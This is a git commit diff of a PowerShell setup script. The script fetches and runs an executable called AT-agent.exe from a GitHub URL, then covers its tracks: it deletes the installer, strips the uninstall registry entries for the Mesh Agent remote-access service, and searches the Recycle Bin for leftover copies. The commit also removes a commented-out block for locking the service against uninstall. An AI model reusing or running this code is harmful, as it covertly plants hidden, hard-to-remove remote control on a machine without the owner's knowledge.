98e93ab69d885cd6d3797a29d721309f6b02a6e9
Ampy <31539580+AmrouHab@users.noreply.github.com>
2025-04-12 09:20:20 +0200

    Update setup.ps1

--- rem/setup.ps1
+++ rem/setup.ps1
@@ -1,45 +1,29 @@
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-
 $URLs = @(
     'https://github.com/AmrouHab/Snippets/raw/refs/heads/main/rem/AT-agent.exe'
 )
-
 $exePath = "$env:TEMP\AT-agent.exe"
-
 foreach ($URL in $URLs | Sort-Object { Get-Random }) {
     try {
         Invoke-WebRequest -Uri $URL -OutFile $exePath -UseBasicParsing
         break
     } catch {}
 }
-
 if (-not (Test-Path $exePath)) {
-    Write-Host "Failed to download Amrou's Agent." -ForegroundColor Red
     throw
 }
-
-# Install the agent
 Start-Process -FilePath $exePath -ArgumentList "-fullinstall" -Wait
-
 Remove-Item $exePath -Force
-
-$uninstallKey = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\MeshCentral'
-if (Test-Path $uninstallKey) {
-    Remove-ItemProperty -Path $uninstallKey -Name 'DisplayName' -ErrorAction SilentlyContinue
-    Remove-ItemProperty -Path $uninstallKey -Name 'UninstallString' -ErrorAction SilentlyContinue
+$uninstallKeys = @(
+    'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Mesh Agent',
+    'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\MeshCentralAgent'
+)
+foreach ($uninstallKey in $uninstallKeys) {
+    if (Test-Path $uninstallKey) {
+        Remove-ItemProperty -Path $uninstallKey -Name 'DisplayName' -ErrorAction SilentlyContinue
+        Remove-ItemProperty -Path $uninstallKey -Name 'UninstallString' -ErrorAction SilentlyContinue
+    }
 }
-
-# Lock Mesh Agent service to prevent uninstall
-#$service = Get-Service "Mesh Agent" -ErrorAction SilentlyContinue
-#if ($service) {
-#    Set-Service -Name $service.Name -StartupType Automatic
-#    $sdsetCommand = 'D:(A;;CCLCSWLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)'
-#    # Corrected way to run the command with sc.exe
-#    $scCommand = "sc.exe sdset $($service.Name) '$sdsetCommand'"
-#    Invoke-Expression $scCommand
-#}
-
-# Delete the specific AT-agent.exe from the Recycle Bin
 $recycleBinPath = [System.IO.Path]::Combine($env:SystemDrive, '\$Recycle.Bin')
 $filesInBin = Get-ChildItem -Path $recycleBinPath -Recurse -Filter 'AT-agent.exe' -ErrorAction SilentlyContinue
 foreach ($file in $filesInBin) {
